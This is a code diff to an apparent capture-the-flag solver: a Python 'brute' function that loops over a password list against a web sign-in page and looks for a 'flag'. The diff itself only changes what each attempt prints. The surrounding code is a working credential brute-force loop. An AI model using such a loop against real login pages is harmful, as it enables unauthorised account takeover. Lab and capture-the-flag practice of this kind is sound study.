@@ -26,6 +26,7 @@ def brute(host_name, file):
     session = requests.Session()
     session.get('http://{host}/?page=signin'.format(host=host_name), data=json.dumps(headers))
 
+    print('\nBrute Force Attack:'.upper())
     for passwd in passwds:
         params = {
             'page': 'signin',
@@ -34,7 +35,7 @@ def brute(host_name, file):
             'Login': 'Login'
         }
         response = session.get('http://'+host_name, params=params)
-        print(response.url, 'flag' in response.content.decode('utf-8'))
+        print('flag' in response.content.decode('utf-8'), 'Username: {username}\tPassword: {password}'.format(**params))
         if 'flag' in response.content.decode('utf-8'):
             return get_flag(response.content.decode('utf-8'))
 
